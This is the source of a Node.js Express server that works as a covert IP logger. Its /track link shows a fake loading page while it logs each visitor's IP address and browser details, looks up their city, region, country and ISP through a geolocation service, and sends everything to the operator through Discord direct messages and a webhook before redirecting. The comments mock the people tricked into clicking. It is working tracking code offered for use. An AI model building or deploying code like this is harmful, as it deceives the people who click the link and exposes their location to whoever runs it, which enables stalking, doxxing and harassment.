const express = require("express");
const fs = require("fs");
const app = express();
const PORT = process.env.PORT || 3000;
const LOG_FILE = "visits.json";

const BOT_TOKEN = process.env.TOKEN;
const WEBHOOK_URL = process.env.WEBHOOK_URL;
const YOUR_DISCORD_USER_ID = "1473465013946552362";

if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, JSON.stringify([]));
}

const dmMessages = [
  `bro someone actually clicked it 💀 they cooked`,
  `LMAOO another one fell for it 🔥`,
  `bro really said lemme click this link 💀💀`,
  `caught in 4k no cap 😭🔥`,
  `they really said bet and clicked it 💀`,
  `anotha one 🎉 they had no idea lmaooo`,
  `bro walking into the trap rn 😭😭`,
  `nah they really clicked it on god 💀🔥`,
];

async function sendDM(ip, userAgent, totalHits, time) {
  try {
    const { default: fetch } = await import("node-fetch");
    const randomMsg = dmMessages[Math.floor(Math.random() * dmMessages.length)];
    const message =
      `${randomMsg}\n\n` +
      `**ip:** \`${ip}\`\n` +
      `**when:** ${time}\n` +
      `**device:** ${userAgent.split(" ").slice(0, 5).join(" ")}\n` +
      `**total hits so far:** ${totalHits} 🍳`;

    const dmRes = await fetch("https://discord.com/api/v10/users/@me/channels", {
      method: "POST",
      headers: {
        Authorization: `Bot ${BOT_TOKEN}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ recipient_id: YOUR_DISCORD_USER_ID }),
    });
    const dm = await dmRes.json();

    await fetch(`https://discord.com/api/v10/channels/${dm.id}/messages`, {
      method: "POST",
      headers: {
        Authorization: `Bot ${BOT_TOKEN}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ content: message }),
    });

    console.log("[DM] notification sent no cap");
  } catch (err) {
    console.error("[DM] failed to send dm rip:", err);
  }
}

app.get("/track", (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"] || "Unknown";
  const timestamp = new Date().toISOString();
  const time = new Date().toLocaleString("en-US", {
    timeZone: "America/Chicago",
    dateStyle: "short",
    timeStyle: "short",
  });

  const visit = { ip, userAgent, timestamp };
  const visits = JSON.parse(fs.readFileSync(LOG_FILE));
  visits.push(visit);
  fs.writeFileSync(LOG_FILE, JSON.stringify(visits, null, 2));

  console.log(`[VISIT] bro really clicked it 💀 — ip: ${ip} — ${timestamp}`);
  sendDM(ip, userAgent, visits.length, time);

  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8" />
      <title>Loading...</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          background: #0f0f0f;
          color: white;
          font-family: sans-serif;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          height: 100vh;
          gap: 20px;
        }
        .spinner {
          width: 48px;
          height: 48px;
          border: 5px solid #333;
          border-top-color: #fff;
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        p { font-size: 16px; color: #aaa; }
        h2 { font-size: 20px; color: white; text-align: center; padding: 0 20px; }
      </style>
    </head>
    <body>
      <h2>dont worry we are getting u to the website where alot of requires happen! 🔥</h2>
      <div class="spinner"></div>
      <p>Redirecting...</p>
      <script>
        const WEBHOOK_URL = "${WEBHOOK_URL}";

        async function getLocationData() {
          try {
            const res = await fetch("https://ipapi.co/json/");
            const data = await res.json();
            return {
              ip: data.ip || "Unknown",
              country: data.country_name || "Unknown",
              region: data.region || "Unknown",
              city: data.city || "Unknown",
              isp: data.org || "Unknown"
            };
          } catch {
            return { ip: "Unknown", country: "Unknown", region: "Unknown", city: "Unknown", isp: "Unknown" };
          }
        }

        async function sendToWebhook(data) {
          if (!WEBHOOK_URL) return;
          await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              username: "ip logger 💀",
              avatar_url: "https://media1.tenor.com/m/nPd-ijwBSKQAAAAd/hacker-pc.gif",
              embeds: [{
                title: "bro just clicked it they so cooked 🔥",
                color: 0x5865F2,
                fields: [
                  { name: "IP", value: data.ip, inline: true },
                  { name: "City", value: data.city, inline: true },
                  { name: "Region", value: data.region, inline: true },
                  { name: "Country", value: data.country, inline: true },
                  { name: "ISP", value: data.isp, inline: true },
                  { name: "Device", value: navigator.userAgent.substring(0, 1024), inline: false },
                  { name: "OS", value: navigator.platform, inline: true },
                ],
                timestamp: new Date().toISOString()
              }]
            })
          });
        }

        async function main() {
          const locationData = await getLocationData();
          await sendToWebhook(locationData);
          setTimeout(() => {
            window.location.href = "https://requirehubv2.pythonanywhere.com";
          }, 1500);
        }

        main();
      </script>
    </body>
    </html>
  `);
});

app.get("/visits", (req, res) => {
  const visits = JSON.parse(fs.readFileSync(LOG_FILE));
  res.json(visits);
});

app.get("/", (req, res) => res.send("servers up no cap ✅"));

app.listen(PORT, () => {
  console.log(`server running on port ${PORT} lets goooo 🔥`);
});
